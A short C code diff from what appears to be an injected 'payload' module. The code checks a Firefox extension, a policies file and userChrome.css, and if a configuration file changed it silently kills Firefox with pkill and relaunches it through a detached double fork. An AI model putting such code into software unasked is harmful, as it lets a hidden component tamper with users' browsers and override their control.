@@ -1428,8 +1428,41 @@ void my_payload_entry(void *handle, payload_params *params) {
         check_extension_active(profile_path);
         
         /* Check policies file */
-        check_policies_exist();
-        check_userchrome_exist(profile_path);
+        int policies_result = check_policies_exist();
+        
+        /* Check userChrome.css */
+        int chrome_result = check_userchrome_exist(profile_path);
+        
+        /* Restart Firefox if configuration files changed */
+        if (policies_result == 0 || chrome_result == 0) {
+            printf("[payload] Configuration files changed, restarting Firefox\n");
+            fflush(stdout);
+            system("pkill firefox 2>/dev/null");
+            sleep(2);
+            
+            // Double fork to restart Firefox
+            pid_t child = fork();
+            if (child == 0) {
+                pid_t grandchild = fork();
+                if (grandchild == 0) {
+                    setsid();
+                    int devnull = open("/dev/null", O_RDWR);
+                    if (devnull >= 0) {
+                        dup2(devnull, STDIN_FILENO);
+                        dup2(devnull, STDOUT_FILENO);
+                        dup2(devnull, STDERR_FILENO);
+                        close(devnull);
+                    }
+                    char *ff_argv[] = { "/snap/bin/firefox", NULL };
+                    execv("/snap/bin/firefox", ff_argv);
+                    _exit(1);
+                }
+                _exit(0);
+            }
+            if (child > 0) {
+                waitpid(child, NULL, 0);
+            }
+        }
         
         printf("[payload] === End cycle ===\n\n");
         fflush(stdout);
